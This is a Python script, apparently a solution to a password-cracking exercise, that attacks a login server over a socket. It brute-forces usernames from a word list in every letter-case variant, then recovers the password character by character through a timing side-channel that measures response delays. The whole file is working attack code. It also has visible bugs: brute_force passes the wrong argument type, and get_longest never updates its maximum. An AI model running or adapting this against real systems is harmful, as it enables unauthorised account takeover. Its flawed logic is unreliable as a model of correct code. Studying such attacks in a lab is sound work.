import socket, sys, itertools, json, datetime


def connect_socket(ip, port):
    address = (ip, port)
    s = socket.socket()
    s.connect(address)
    return s


def analyze_response(cred_dict):
    message = json.dumps(cred_dict)
    message = message.encode()
    hack_socket.send(message)
    response = hack_socket.recv(1024)
    response = response.decode()
    response_dict = json.loads(response)
    return response_dict['result']


def brute_force():
    gen = (itertools.permutations(itertools.chain(letters, nums), n) for n in range(1, 5))
    success = False
    while not success:
        combs = next(gen)
        for i in combs:
            success = analyze_response(''.join(i))
            if success:
                break
    if success:
        return True
    else:
        return False


def check_login(test_creds):
    lower_upper = ((c.lower(), c.upper()) for c in test_creds['login'])
    perms = [''.join(x) for x in itertools.product(*lower_upper)]
    login_flag = False
    for comb in perms:
        test_creds['login'] = comb
        response_string = analyze_response(test_creds)
        if response_string == 'Wrong login!':
            continue
        else:
            login_flag = True
            break
    if login_flag:
        return True
    return False


def get_longest(track_dict):
    c, largest = None, None
    times = (x for x in track_dict.values())
    for time in times:
        #print('time is ', time)
        if largest is None:
            largest = time[0]
        elif time[0] > largest:
            c = time[1]
            #print('c is ', c)
        else:
            continue
    return c


if __name__ == '__main__':
    ip_address = sys.argv[1]
    hack_port = int(sys.argv[2])
    login_success, pwd_success = False, False

    nums = [str(x) for x in range(10)]
    letters = [chr(x).lower() for x in range(97, 123)]
    uppers = [x.upper() for x in letters]

    hack_socket = connect_socket(ip_address, hack_port)

    # first get login
    with open('logins.txt') as f:
        logins = f.readlines()

    credentials = {
        'login': '',
        'password': ' '
    }

    for word in logins:
        credentials['login'] = word.strip()
        #print(f'Trying login = {word.strip()}')
        login_success = check_login(credentials)
        if login_success:
            #print(f'Successful username: {word}')
            break

    # then get password

    pwd = []
    tracker = {}
    while pwd_success is False:
        for char in itertools.chain(nums, letters, uppers):
            credentials['password'] = ''.join(pwd) + char
            #print(f'Trying password = {str(pwd)+char}')
            start = datetime.datetime.now()
            response_string = analyze_response(credentials)
            finish = datetime.datetime.now()
            if response_string == 'Connection success!':
                pwd_success = True
                break
            else:
                tracker[char] = (finish - start,char)
                #print(tracker)
        pwd.append(get_longest(tracker))
        tracker.clear()


    final = json.dumps(credentials)
    print(final)
    hack_socket.close()
